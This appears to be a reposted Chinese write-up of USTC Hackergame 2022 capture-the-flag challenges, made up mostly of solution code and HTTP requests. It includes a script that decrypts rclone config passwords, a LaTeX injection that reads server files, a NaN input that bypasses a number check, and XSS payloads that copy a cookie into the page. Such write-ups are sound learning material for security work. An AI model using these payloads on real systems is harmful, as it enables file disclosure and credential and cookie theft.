# 2022 USTC Hackergame WriteUp 0x01

> 原文: https://www.ctfiot.com/71252.html
> ID: 71252

推荐阅读：

2022蓝帽杯遇见的 SUID 提权 总结篇

CobaltStrike beacon二开指南

Edge浏览器-通过XSS获取高权限从而RCE

The End of AFR?

java免杀合集

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以500RMB-1000RMB不等的奖励，具体文章要求可以查看“投稿须知”。

阅读更多原创技术文章，戳“阅读全文”


```
grep flag{ . -aR
```



```
.config/rclone/rclone.conf
[flag2]
type = ftp
host = ftp.example.com
user = user
pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
```



```
// Package obscure contains the Obscure and Reveal commands
// package obscure
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "errors"
    "fmt"
    "io"
    "log"
)

// crypt internals
var (
    cryptKey = []byte{
        0x9c, 0x93, 0x5b, 0x48, 0x73, 0x0a, 0x55, 0x4d,
        0x6b, 0xfd, 0x7c, 0x63, 0xc8, 0x86, 0xa9, 0x2b,
        0xd3, 0x90, 0x19, 0x8e, 0xb8, 0x12, 0x8a, 0xfb,
        0xf4, 0xde, 0x16, 0x2b, 0x8b, 0x95, 0xf6, 0x38,
    }
    cryptBlock cipher.Block
    cryptRand  = rand.Reader
)

// crypt transforms in to out using iv under AES-CTR.
//
// in and out may be the same buffer.
//
// Note encryption and decryption are the same operation
func crypt(out, in, iv []byte) error {
    if cryptBlock == nil {
        var err error
        cryptBlock, err = aes.NewCipher(cryptKey)
        if err != nil {
            return err
        }
    }
    stream := cipher.NewCTR(cryptBlock, iv)
    stream.XORKeyStream(out, in)
    return nil
}

// Obscure a value
//
// This is done by encrypting with AES-CTR
func Obscure(x string) (string, error) {
    plaintext := []byte(x)
    ciphertext := make([]byte, aes.BlockSize+len(plaintext))
    iv := ciphertext[:aes.BlockSize]
    if _, err := io.ReadFull(cryptRand, iv); err != nil {
        return "", fmt.Errorf("failed to read iv: %w", err)
    }
    if err := crypt(ciphertext[aes.BlockSize:], plaintext, iv); err != nil {
        return "", fmt.Errorf("encrypt failed: %w", err)
    }
    return base64.RawURLEncoding.EncodeToString(ciphertext), nil
}

// MustObscure obscures a value, exiting with a fatal error if it failed
func MustObscure(x string) string {
    out, err := Obscure(x)
    if err != nil {
        log.Fatalf("Obscure failed: %v", err)
    }
    return out
}

// Reveal an obscured value
func Reveal(x string) (string, error) {
    ciphertext, err := base64.RawURLEncoding.DecodeString(x)
    if err != nil {
        return "", fmt.Errorf("base64 decode failed when revealing password - is it obscured?: %w", err)
    }
    if len(ciphertext) < aes.BlockSize {
        return "", errors.New("input too short when revealing password - is it obscured?")
    }
    buf := ciphertext[aes.BlockSize:]
    iv := ciphertext[:aes.BlockSize]
    if err := crypt(buf, buf, iv); err != nil {
        return "", fmt.Errorf("decrypt failed when revealing password - is it obscured?: %w", err)
    }
    return string(buf), nil
}

// MustReveal reveals an obscured value, exiting with a fatal error if it failed
func MustReveal(x string) string {
    out, err := Reveal(x)
    if err != nil {
        log.Fatalf("Reveal failed: %v", err)
    }
    return out
}

func main() {
    fmt.Println(Reveal("tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ"))
}
# go run exp.go
flag{get_rclone_password_from_config!_2oi3dz1} <nil>
```



```
# rclone reveal
Usage:
  rclone reveal password [flags]

Flags:
  -h, --help   help for reveal

Use "rclone [command] --help" for more information about a command.
Use "rclone help flags" for to see the global flags.
Use "rclone help backends" for a list of supported services.
Command reveal needs 1 arguments minimum: you provided 0 non flag arguments: []
# rclone reveal tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
flag{get_rclone_password_from_config!_2oi3dz1}
```



```
#!/usr/bin/env python3
from hashlib import sha256

a = [0] * 10000

a[1225 | 2381 | 2956 | 3380 | 3441 | 4073 | 4090 | 4439 | 5883 | 6253 | 7683 | 8231 | 9933] = 978
a[412 | 5923 | 7217 | 7289 | 7336] = 51
a[296 | 612 | 873 | 1232 | 1531 | 1941 | 3640 | 4449 | 4488 | 4698 | 4703 | 5225 | 5868 | 6132 | 6904 | 7812 | 8127 | 9156 | 9781 | 9917] = 807
# ...

def check(a):
    user_hash = sha256(('heilang' + ''.join(str(x) for x in a)).encode()).hexdigest()
    expect_hash = '76bd735ba6f0ca6213528caa474714a5322f668d6748e4214c79df4306ec9439'
    return user_hash == expect_hash

def get_flag(a):
    if check(a):
        t = ''.join([chr(x % 255) for x in a])
        flag = sha256(t[:-16].encode()).hexdigest()[:16] + '-' + sha256(t[-16:].encode()).hexdigest()[:16]
        print("Tha flag is: flag{{{}}}".format(flag))
    else:
        print("Array content is wrong, you can not get the correct flag.")

if __name__ == "__main__":
    get_flag(a)
```



```
#!/usr/bin/env python3
import re
from hashlib import sha256

a = [0] * 10000

with open('getflag.hei.py', 'r', encoding='utf-8') as f:
    s = f.read()

r = re.findall(r"a[(.*)] = (d+)", s, re.M)
for d in r:
    l = d[0].split(' | ')
    for i in l:
        a[int(i)] = int(d[1])

def check(a):
    user_hash = sha256(('heilang' + ''.join(str(x)
                       for x in a)).encode()).hexdigest()
    expect_hash = '76bd735ba6f0ca6213528caa474714a5322f668d6748e4214c79df4306ec9439'
    return user_hash == expect_hash

def get_flag(a):
    if check(a):
        t = ''.join([chr(x % 255) for x in a])
        flag = sha256(t[:-16].encode()).hexdigest()[:16] + 
            '-' + sha256(t[-16:].encode()).hexdigest()[:16]
        print("Tha flag is: flag{{{}}}".format(flag))
    else:
        print("Array content is wrong, you can not get the correct flag.")

if __name__ == "__main__":
    get_flag(a)
# Tha flag is: flag{6d9ad6e9a6268d96-ba7e80b7a7fa0224}
```



```
import requests
import re

s = requests.Session()
r = s.get("http://202.38.93.111:10047/xcaptcha?token=xxxx")
print(r.status_code)
print(r.text)

r = s.get("http://202.38.93.111:10047/xcaptcha").text
print(r)

data = re.findall(r'<label for="captchad">(d+)+(d+) 的', r)
l = []
for i in data:
    l.append(int(i[0]) + int(i[1]))
print(l)

post_data = dict(captcha1=l[0], captcha2=l[1], captcha3=l[2])
print(post_data)
r = s.post("http://202.38.93.111:10047/xcaptcha", data=post_data).text

# post_data = f"captcha1={l[0]}&captcha2={l[1]}&captcha3={l[2]}"
# headers = {"Content-Type": "application/x-www-form-urlencoded"}
# r = s.post("http://202.38.93.111:10047/xcaptcha", data=post_data, headers=headers).text

print(r)
# flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_afd9a3e77c}
```



```
import win32api
import win32con

hWnd = int('001E0D4C', 16)
win32api.SendMessage(hWnd,win32con.WM_LBUTTONDOWN,0,0)
win32api.SendMessage(hWnd,win32con.WM_LBUTTONUP,0,0)
```



```
pip install pywin32==300
```



```
flag{Y0u_rea1ly_kn0w_Win32API_89ab91ac0c}
```



```
#include <windows.h>
#include <stdio.h>

int main(void){
    HWND target = NULL;

    // 获取窗口句柄
    target = FindWindowW(L"flag 自动机", L"flag 自动机");
    if (target == NULL){
        printf("error!");
        return -1;
    }
    printf("0x%x", target);

    // 发送消息
    PostMessageW(target, 0x111, 3, 114514);
    return 0;
}
```



```
import win32con
import win32gui
hwnd = win32gui.FindWindow(None, "flag 自动机")
win32gui.SendMessage(
    hwnd,                           # hWnd
    win32con.WM_COMMAND,            # Msg
    win32con.BN_CLICKED << 16 | 3,  # wParam
    0x1bf52                         # lParam
)
```



```
float sceneSDF(vec3 p, out vec3 pColor) {
    pColor = vec3(1.0, 1.0, 1.0);

    vec4 pH = mk_homo(p);
    vec4 pTO = mk_trans(35.0, -5.0, -20.0) * mk_scale(1.5, 1.5, 1.0) * pH;

    float t1 = t1SDF(pTO.xyz);
    float t2 = t2SDF((mk_trans(-45.0, 0.0, 0.0) * pTO).xyz);
    float t3 = t3SDF((mk_trans(-80.0, 0.0, 0.0) * pTO).xyz);
    float t4 = t4SDF((mk_trans(-106.0, 0.0, 0.0) * pTO).xyz);
    float t5 = t5SDF(p - vec3(36.0, 10.0, 15.0), vec3(30.0, 5.0, 5.0), 2.0);

    float tmin = min(min(min(min(t1, t2), t3), t4), t5);
    return tmin;
}
```



```
float t5 = t5SDF(vec3(36.0, 10.0, 15.0), vec3(30.0, 5.0, 5.0), 2.0);
```



```
flag{SDF-i3-FuN!}
```



```
flag{8_1ayER_rogeRS_81ind_V1a}
```



```
POST /doku.php?id=start HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=5nlriqummcitbeg1fgjl3t5cuu; session=xxxxxxxxx; DOKU_PREFS=list%23thumbs
Content-Length: 120
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Host: 202.38.93.111:15004
Connection: Keep-alive

difftype=sidebyside'"()%26%25<zzz><ScRiPt%20>alert(00)</ScRiPt>&do=diff&do[diff]=1&id=start&rev2[0]=0&rev2[1]=0&sectok=1
```



```
POST /doku.php?id=start HTTP/1.1
Host: 202.38.93.111:15004
Content-Length: 90
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://202.38.93.111:15004
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://202.38.93.111:15004/doku.php?id=start
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

sectok=&id=start&do=diff&difftype=sidebyside&rev2%5B1%5D=1666320802&rev2%5B0%5D=1665224461
```



```
flag{d1gandFInD_d0kuw1k1_unexpectEd_API}
```



```
documentclass[preview]{standalone}
begin{document}
$$
$$
end{document}
```



```
input{/flag1}
```



```
flag{becAr3fu11dUd3a71669bc56}
```



```
catcode `$=12
catcode `#=12
catcode `_=12
catcode `&=12
input{path_to_script.pl}
```



```
latex_to_image_converter.sh
#!/bin/bash

set -xe
head -n 3 /app/base.tex > /dev/shm/result.tex
cat /dev/shm/input.tex >> /dev/shm/result.tex
tail -n 2 /app/base.tex >> /dev/shm/result.tex
cd /dev/shm
pdflatex -interaction=nonstopmode -halt-on-error -no-shell-escape result.tex
pdfcrop result.pdf
mv result-crop.pdf result.pdf
pdftoppm -r 300 result.pdf > result.ppm
pnmtopng result.ppm > $1
OMP_NUM_THREADS=1 convert $1 -trim $1
Dockerfile
FROM debian:bullseye-slim

# deps
RUN sed -i 's/deb.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list && 
    apt update && apt -y upgrade && 
    apt install --no-install-recommends -y texlive-latex-base texlive-latex-extra texlive-extra-utils ghostscript poppler-utils pnmtopng graphicsmagick-imagemagick-compat python3 && 
    rm -rf /var/lib/apt/lists/* && 
    mkdir /app

COPY server.py /app/
COPY latex_to_image_converter.sh /app/
COPY base.tex /app/

CMD ["python3", "/app/server.py"]
```



```
POST / HTTP/1.1
Host: 202.38.93.111:10020
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://202.38.93.111:10020
Connection: close
Referer: http://202.38.93.111:10020/
Cookie: session=xxxxxxxxxx
Upgrade-Insecure-Requests: 1

latex-text=$$input{/flag1}\catcode+`#=12\catcode+`_=12input{/flag2}$$Meow
```



```
flag{latex_bec_0_m##es_co__#ol_7d3e6626cc}
```



```
public String flag() {
         var prefix = System.getenv(FLAG_PREFIX);
         var input = System.getenv(FLAG_SECRET) + ":" + this.raw;
         var digest = SHA256_DIGEST.digest(input.getBytes(StandardCharsets.UTF_8));
         return String.format("flag{%s-%016x}", prefix, ByteBuffer.wrap(digest).getLong());
      }
   }

   private record State(Token token, int passed, int talented, double number, OptionalDouble previous) {
      private static final Random RNG = new SecureRandom();

      private State(Token token) {
         this(token, 0, 0, RNG.nextInt(1, 1000000) * 1e-6, OptionalDouble.empty());
      }

      private void collect(XMLStreamWriter writer) throws XMLStreamException {
         writer.writeStartDocument();
         // <state>
         writer.writeStartElement("state");
         // <name>
         writer.writeStartElement("name");
         writer.writeCharacters(this.token.user());
         writer.writeEndElement();
         // </name><passed>
         writer.writeStartElement("passed");
         writer.writeCharacters(Integer.toString(this.passed));
         writer.writeEndElement();
         // </passed><talented>
         writer.writeStartElement("talented");
         writer.writeCharacters(Integer.toString(this.talented));
         writer.writeEndElement();
         // </talented>
         if (this.previous.isPresent()) {
            // <guess>
            var previous = this.previous.getAsDouble();

            var isLess = previous < this.number - 1e-6 / 2;
            var isMore = previous > this.number + 1e-6 / 2;

            writer.writeStartElement("guess");
            writer.writeAttribute("less", Boolean.toString(isLess));
            writer.writeAttribute("more", Boolean.toString(isMore));
            writer.writeCharacters(Double.toString(previous));
            writer.writeEndElement();
            // </guess>
         }
         if (this.talented > 0) {
            // <flag>
            writer.writeStartElement("flag");
            writer.writeCharacters(this.token.flag());
            writer.writeEndElement();
            // </flag>
         }
         writer.writeEndElement();
         // </state>
      }

      private State update(XMLEventReader reader) throws XMLStreamException {
         var result = Optional.<State>empty();
         var nameStack = new Stack<String>();
         while (reader.hasNext()) {
            var event = reader.nextEvent();
            if (event.isStartElement()) {
               var name = event.asStartElement().getName().getLocalPart();
               nameStack.push(name);
            }
            if (event.isEndElement()) {
               if (nameStack.empty()) throw new XMLStreamException();
               var name = event.asEndElement().getName().getLocalPart();
               if (!name.equals(nameStack.pop())) throw new XMLStreamException();
            }
            if (event.isCharacters()) {
               var path = List.of("state", "guess");
               if (!path.equals(nameStack)) continue;
               if (result.isPresent()) throw new XMLStreamException();
               try {
                  var guess = Double.parseDouble(event.asCharacters().getData());

                  var isLess = guess < this.number - 1e-6 / 2;
                  var isMore = guess > this.number + 1e-6 / 2;

                  var isPassed = !isLess && !isMore;
                  var isTalented = isPassed && this.previous.isEmpty();

                  var newPassed = isPassed ? this.passed + 1 : this.passed;
                  var newTalented = isTalented ? this.talented + 1 : this.talented;
                  var newNumber = isPassed ? RNG.nextInt(1, 1000000) * 1e-6 : this.number;
                  var newPrevious = isPassed ? OptionalDouble.empty() : OptionalDouble.of(guess);

                  result = Optional.of(new State(this.token, newPassed, newTalented, newNumber, newPrevious));
               } catch (NumberFormatException e) {
                  throw new XMLStreamException(e);
               }
            }
         }
         if (!nameStack.empty()) throw new XMLStreamException();
         if (result.isEmpty()) throw new XMLStreamException();
         return result.get();
      }
   }

   private static void dispatch(com.sun.net.httpserver.HttpExchange exchange) throws IOException {
      var method = exchange.getRequestMethod().toUpperCase(Locale.ROOT);
      switch (method + ' ' + exchange.getRequestURI().getPath()) {
         case "HEAD /", "HEAD /index.html", "HEAD /github-markdown.css" -> head(exchange);
         case "HEAD /GuessNumber.java", "HEAD /state" -> head(exchange);
         case "GET /", "GET /index.html" -> index(exchange);
         case "GET /github-markdown.css" -> style(exchange);
         case "GET /GuessNumber.java" -> source(exchange);
         case "POST /state" -> update(exchange);
         case "GET /state" -> collect(exchange);
         default -> bad(exchange);
      }
   }
```



```
POST /state HTTP/1.1
Host: 202.38.93.111:18000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://202.38.93.111:18000/
authorization: Bearer xxxxxxxxxxxxxxxxxxxxxx
Content-Type: text/plain;charset=UTF-8
Content-Length: 33
Origin: http://202.38.93.111:18000
Connection: keep-alive
Cookie: session=xxxxxxxxxxxxxx

<state><guess>NaN</guess></state>
```



```
<?xml version="1.0" ?><state><name>36</name><passed>3</passed><talented>1</talented><flag>flag{gu3ss-n0t-a-numb3r-1nst3ad-f9c5df036092eada}</flag></state>
```



```
# Copyright 2022 USTC-Hackergame
# Copyright 2021 PKU-GeekGame
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

from selenium import webdriver
import selenium
import sys
import time
import urllib.parse
import os
# secret.py will NOT be revealed to players
from secret import FLAG, BOT_SECRET

LOGIN_URL = f'http://web/?bot={BOT_SECRET}'

print('Please submit your quiz URL:')
url = input('> ')

# URL replacement
# In our environment bot access http://web
# If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code
# and write your own logic to use your own token to "login" with headless browser
parsed = urllib.parse.urlparse(url)
parsed = parsed._replace(netloc="web", scheme="http")
url = urllib.parse.urlunparse(parsed)

print(f"Your URL converted to {url}")

try:
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox') # sandbox not working in docker
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--user-data-dir=/dev/shm/user-data')
    os.environ['TMPDIR'] = "/dev/shm/"
    options.add_experimental_option('excludeSwitches', ['enable-logging'])

    with webdriver.Chrome(options=options) as driver:
        ua = driver.execute_script('return navigator.userAgent')
        print(' I am using', ua)

        print('- Logining...')
        driver.get(LOGIN_URL)
        time.sleep(4)

        print(' Putting secret flag...')
        driver.execute_script(f'document.cookie="flag={FLAG}"')
        time.sleep(1)

        print('- Now browsing your quiz result...')
        driver.get(url)
        time.sleep(4)

        try:
            greeting = driver.execute_script(f"return document.querySelector('#greeting').textContent")
            score = driver.execute_script(f"return document.querySelector('#score').textContent")
        except selenium.common.exceptions.JavascriptException:
            print('JavaScript Error: Did you give me correct URL?')
            exit(1)

        print("OK. Now I know that:")
        print(greeting)
        print(score)

    print('- Thank you for joining my quiz!')

except Exception as e:
    print('ERROR', type(e))
    import traceback
    traceback.print_exception(*sys.exc_info(), limit=0, file=None, chain=False)
```



```
function click() {
var url = window.location.href;
var input = document.createElement('input');
input.setAttribute('readonly', 'readonly');
input.setAttribute('value', url);
document.body.appendChild(input);
input.select();
if (document.execCommand('copy')) {
document.execCommand('copy');
alert('已复制到剪贴板');
}
document.body.removeChild(input);
}

document.querySelector("#copy").addEventListener("click", click);

const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const result = urlParams.get('result');
const b64decode = atob(result);
const colon = b64decode.indexOf(":");
const score = b64decode.substring(0, colon);
const username = b64decode.substring(colon + 1);

document.querySelector("#greeting").innerHTML = "您好，" + username + "！";
document.querySelector("#score").innerHTML = "您在练习中获得的分数为 <b>" + score + "</b>/100。";
```



```
100</b><img/src=1 onerror=alert(1)>:miao
```



```
100</b><img/src=1 onerror="document.querySelector('#score').textContent=document.cookie">:miao
```



```
flag{xS5_1OI_is_N0t_SOHARD_e3c7ac115c}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/10-1667794671.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1667794672.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1667794673.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1667794674.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1667794674.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1667794676.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1667794677.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1667794679.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1667794680.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667794680.png)